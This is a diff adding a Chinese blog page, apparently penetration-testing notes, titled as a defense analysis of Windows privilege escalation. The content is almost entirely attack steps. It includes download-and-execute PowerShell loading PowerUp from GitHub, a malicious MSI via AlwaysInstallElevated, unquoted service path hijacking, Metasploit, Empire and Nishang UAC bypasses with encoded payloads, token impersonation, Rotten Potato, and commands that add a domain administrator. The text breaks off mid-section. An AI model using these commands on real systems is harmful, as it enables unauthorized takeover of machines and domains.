@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>权限提升防御分析 - Geekby&#39;s Blog</title><meta name="Description" content="权限提升防御分析"><meta property="og:title" content="权限提升防御分析" />
+<meta property="og:description" content="权限提升防御分析" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-02-15T09:07:00+08:00" />
+<meta property="article:modified_time" content="2020-02-15T09:07:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="权限提升防御分析"/>
+<meta name="twitter:description" content="权限提升防御分析"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/" /><link rel="prev" href="https://www.geekby.site/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" /><link rel="next" href="https://www.geekby.site/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "权限提升防御分析",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2020\/02\/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "域安全, 内网渗透","wordcount":  398 ,
+        "url": "https:\/\/www.geekby.site\/2020\/02\/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90\/","datePublished": "2020-02-15T09:07:00+08:00","dateModified": "2020-02-15T09:07:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "权限提升防御分析"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">权限提升防御分析</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw"></i>内网渗透</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-02-15">2020-02-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 398 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#系统内核溢出漏洞提权">系统内核溢出漏洞提权</a>
+      <ul>
+        <li><a href="#手动执行命令发现缺失补丁">手动执行命令发现缺失补丁</a></li>
+        <li><a href="#windows-exploit-suggester">Windows Exploit Suggester</a></li>
+        <li><a href="#powershell-中的-sherlock-脚本">powershell 中的 sherlock 脚本</a></li>
+      </ul>
+    </li>
+    <li><a href="#windows-配置错误利用">Windows 配置错误利用</a>
+      <ul>
+        <li><a href="#系统服务权限配置错误">系统服务权限配置错误</a>
+          <ul>
+            <li><a href="#powerup">powerup</a></li>
+            <li><a href="#metasploit-下的利用">metasploit 下的利用</a></li>
+          </ul>
+        </li>
+        <li><a href="#注册表键-alwaysinstallelevated">注册表键 AlwaysInstallElevated</a></li>
+        <li><a href="#可信任服务路径漏洞">可信任服务路径漏洞</a>
+          <ul>
+            <li><a href="#metasploit-下的利用-1">metasploit 下的利用</a></li>
+          </ul>
+        </li>
+        <li><a href="#自动安装配置文件">自动安装配置文件</a></li>
+        <li><a href="#计划任务">计划任务</a>
+          <ul>
+            <li><a href="#查看计划任务">查看计划任务</a></li>
+            <li><a href="#查询可写的计划任务文件夹">查询可写的计划任务文件夹</a></li>
+            <li><a href="#列出某个驱动器下所有权限配置有缺陷的文件夹">列出某个驱动器下所有权限配置有缺陷的文件夹</a></li>
+            <li><a href="#列出某个驱动器下所有权限配置有缺陷的文件">列出某个驱动器下所有权限配置有缺陷的文件</a></li>
+          </ul>
+        </li>
+        <li><a href="#empire-内置模块">Empire 内置模块</a></li>
+      </ul>
+    </li>
+    <li><a href="#绕过-uac-提权">绕过 UAC 提权</a>
+      <ul>
+        <li><a href="#bypassuac-模块">bypassuac 模块</a></li>
+        <li><a href="#runas-模块">RunAs 模块</a></li>
+        <li><a href="#nishang-中的-invoke-psuacme-模块">Nishang 中的 Invoke-PsUACme 模块</a></li>
+        <li><a href="#empire-中的-bypassuac-模块">Empire 中的 bypassuac 模块</a>
+          <ul>
+            <li><a href="#bypassuac-模块-1">bypassuac 模块</a></li>
+            <li><a href="#bypassuac_wscript-模块">bypassuac_wscript 模块</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#令牌窃取">令牌窃取</a>
+      <ul>
+        <li><a href="#msf-上的令牌窃取">msf 上的令牌窃取</a></li>
+        <li><a href="#rotten-potato-本地提权">Rotten Potato 本地提权</a></li>
+        <li><a href="#添加域管理员">添加域管理员</a></li>
+        <li><a href="#empire-下的令牌窃取分析">Empire 下的令牌窃取分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#无凭证下的权限获取">无凭证下的权限获取</a>
+      <ul>
+        <li><a href="#llmnr-和-netbios-欺骗攻击">LLMNR 和 NetBIOS 欺骗攻击</a>
+          <ul>
+            <li><a href="#responder-工具">Responder 工具</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="权限提升防御分析">权限提升防御分析</h1>
+<h2 id="系统内核溢出漏洞提权">系统内核溢出漏洞提权</h2>
+<h3 id="手动执行命令发现缺失补丁">手动执行命令发现缺失补丁</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">systeminfo
+wmic qfe get Caption,Description,HotfixID,InstalledOn
+</code></pre></td></tr></table>
+</div>
+</div><p>发现补丁编号</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">wmic qfe get Caption,Description,HotfixID,InstalledOn <span class="p">|</span> findstr C:<span class="s2">&#34;KB3143141&#34;</span> C:/<span class="s2">&#34;KB976902&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="windows-exploit-suggester">Windows Exploit Suggester</h3>
+<p>使用  <code>systeminfo</code> 命令获取当前系统的补丁安装状况，并将信息导入 <code>patches.txt</code> 文件中</p>
+<ol>
+<li>更新补丁信息</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python windows-exploit-suggester.py --update
+</code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>检查漏洞</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python windows-exploit-suggester.py -d 2019-02-02-mssb.xls -i patches.txt
+</code></pre></td></tr></table>
+</div>
+</div><p><code>Metasploit</code> 内置 <code>local_exploit_suggester</code> 模块</p>
+<h3 id="powershell-中的-sherlock-脚本">powershell 中的 sherlock 脚本</h3>
+<p><a href="https://github.com/rasta-mouse/Sherlock" target="_blank" rel="noopener noreffer">https://github.com/rasta-mouse/Sherlock</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">import-module</span> <span class="p">.\</span><span class="n">Sherlock</span><span class="p">.</span><span class="n">ps1</span> 
+<span class="nb">Find-AllVulns</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><a href="https://github.com/rasta-mouse/Watson" target="_blank" rel="noopener noreffer">https://github.com/rasta-mouse/Watson</a></p>
+<h2 id="windows-配置错误利用">Windows 配置错误利用</h2>
+<h3 id="系统服务权限配置错误">系统服务权限配置错误</h3>
+<h4 id="powerup">powerup</h4>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" target="_blank" rel="noopener noreffer">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-Command</span> <span class="s2">&#34;&amp;{Import-Module .\PowerUP.ps1;Invoke-AllChecks}&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowershellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;);Invoke-AllChecks&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200213110922.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200213110922.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200213110922.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200213110922.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200213110922.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200213110922.png-water_print" /></p>
+<h4 id="metasploit-下的利用">metasploit 下的利用</h4>
+<p>对应模块 <code>service_permissions</code>。</p>
+<h3 id="注册表键-alwaysinstallelevated">注册表键 AlwaysInstallElevated</h3>
+<p><code>AlwaysInstallElevated</code> 是一个策略设置。微软允许非授权用户以 <code>SYSTEM</code> 权限运行安装文件(MSI)，如果用户启用此策略设置，那么黑客利用恶意的 <code>MSI</code> 文件就可以进行管理员权限的提升。假设我们拿到目标主机的 <code>Meterpreter</code> 会话后并没能通过一些常规方式取得 <code>SYSTEM</code> 权限，那么 <code>AlwaysInstallElevated</code> 提权可以给我们带来另一条思路。</p>
+<ul>
+<li>手动检测注册表：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre></td></tr></table>
+</div>
+</div><p>如果值均为 <code>1</code>，说明存在风险</p>
+<ul>
+<li>PowerUp 脚本</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowershellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;);Get-RegistryAlwaysInstallElevated&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>添加账户</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Write-UserAddMSI</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>以普通用户运行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">msiexec /q /i UserAdd.smi
+</code></pre></td></tr></table>
+</div>
+</div><p>也可以利用 <code>msf</code> 中的 <code>always_install_elevated</code> 模块</p>
+<h3 id="可信任服务路径漏洞">可信任服务路径漏洞</h3>
+<h4 id="metasploit-下的利用-1">metasploit 下的利用</h4>
+<ul>
+<li>检测目标机器是否存在漏洞</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">wmic service get name,displayname,pathname,startmode<span class="p">|</span>findstr /i <span class="s2">&#34;Auto&#34;</span> <span class="p">|</span> findstr /i /v <span class="s2">&#34;C:\Windows\\&#34;</span><span class="p">|</span>findstr /i /v <span class="s2">&#34;&#34;&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>把要上传的程序重命名并放置在此漏洞且可写的目录下，执行如下命令：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">sc stop service_name
+sc start service_name
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>也可以使用 msf 中的 <code>Windows Service Trusted Path Privilege Escalation</code> 模块进行测试</li>
+</ul>
+<p><code>注意：</code> msf 要设置 <code>set AutoRunScript migrate -f</code> 防止掉线</p>
+<h3 id="自动安装配置文件">自动安装配置文件</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="k">dir</span> /b /s c:\Unattend.xml
+<span class="k">dir</span> /b /s c:\sysprep.xml
+</code></pre></td></tr></table>
+</div>
+</div><p>查看文件中知否存在 <code>base64</code> 加密的密码</p>
+<p>msf 中集成了该漏洞的利用模块 <code>post/windows/gather/enum_unattend</code></p>
+<h3 id="计划任务">计划任务</h3>
+<h4 id="查看计划任务">查看计划任务</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">schtasks /query /fo LIST /v
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="查询可写的计划任务文件夹">查询可写的计划任务文件夹</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">accesschk.exe -dqc <span class="s2">&#34;C:\Microsoft&#34;</span> -accepteula
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="列出某个驱动器下所有权限配置有缺陷的文件夹">列出某个驱动器下所有权限配置有缺陷的文件夹</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">accesschk.exe -uwdqsUsersc:\
+accesschk.exe -uwdqs<span class="s2">&#34;AuthenticatedUsers&#34;</span>c:\
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="列出某个驱动器下所有权限配置有缺陷的文件">列出某个驱动器下所有权限配置有缺陷的文件</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">accesschk.exe -uwdqsUsersc:\*.*
+accesschk.exe -uwdqs<span class="s2">&#34;AuthenticatedUsers&#34;</span>c:\*.*
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="empire-内置模块">Empire 内置模块</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">usermode privesc/powerup/xxxx
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="绕过-uac-提权">绕过 UAC 提权</h2>
+<h3 id="bypassuac-模块">bypassuac 模块</h3>
+<p>前提：当前用户必须在管理员组中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">exploit/windows/local/bypassuac
+exploit/windows/local/bypassuac_inject
+getsystem
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="runas-模块">RunAs 模块</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">exploit/windows/local/ask
+</code></pre></td></tr></table>
+</div>
+</div><p>弹出一个 UAC 框，用户点击后会弹回一个高权限的 shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">getuid 查看权限，如果是普通用户权限，执行 getsystem 提权
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="nishang-中的-invoke-psuacme-模块">Nishang 中的 Invoke-PsUACme 模块</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">Invoke-PsUACme -Verbose ## 使用Sysprep方法并执行默认的Payload
+Invoke-PsUACme -method oobe -Verbose ## 使用oobe方法方法并执行默认的Payload
+Invoke-PsUACme -Payload <span class="s2">&#34;powershell -windowstyle hidden -e YourEncodedPayload&#34;</span>
+## 使用-Payload参数，可以自行指定要执行的Payload
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="empire-中的-bypassuac-模块">Empire 中的 bypassuac 模块</h3>
+<h4 id="bypassuac-模块-1">bypassuac 模块</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">usemode privesc/bypassuac 
+execute
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="bypassuac_wscript-模块">bypassuac_wscript 模块</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">usemode privesc/bypassuac_wscript
+execute
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="令牌窃取">令牌窃取</h2>
+<h3 id="msf-上的令牌窃取">msf 上的令牌窃取</h3>
+<p>假设已经获取了 meterpreter shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">use incognito
+list_tokens -u
+</code></pre></td></tr></table>
+</div>
+</div><p>在 <code>incognito</code> 中调用 <code>impersonate_token</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">impersonate_token DESKTOP-DUNPKQ9\\Administrator
+</code></pre></td></tr></table>
+</div>
+</div><p><code>注意</code>：在输入主机名 <code>\</code> 用户名时，需要输入两个反斜杠</p>
+<h3 id="rotten-potato-本地提权">Rotten Potato 本地提权</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use incognito
+list_tokens -u
+execute -HC -f rottenpotato.exe
+impersonate_token &#34;NT AUTHORITY\\SYSTEM&#34;
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="添加域管理员">添加域管理员</h3>
+<p>假设网络中设置了域管进程，在 <code>meterpreter shell</code> 中迁移进程至域管进程中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net user test test123!@# /ad /domain
+net group <span class="s2">&#34;domain admins&#34;</span> test /ad /domain
+</code></pre></td></tr></table>
+</div>
+</div><p>同样，在 <code>meterpreter shell</code> 中可以使用 <code>incognito</code> 来模拟域管理员，然后通过迭代系统中所有可用的身份验证令牌来添加域管理员。</p>
+<p>在活动的  <code>meterpreter shell</code> 中执行如下命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">add_user test test!@#123 -h 1.1.1.2
+</code></pre></td></tr></table>
+</div>
+</div><p>执行如下命令，将该账户加到域管理员组中。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">add_user &#34;Domain Admins&#34; test -h 1.1.1.2
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="empire-下的令牌窃取分析">Empire 下的令牌窃取分析</h3>
+<p>运行 <code>mimikatz</code>，输入 <code>creds</code></p>
+<p>执行:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
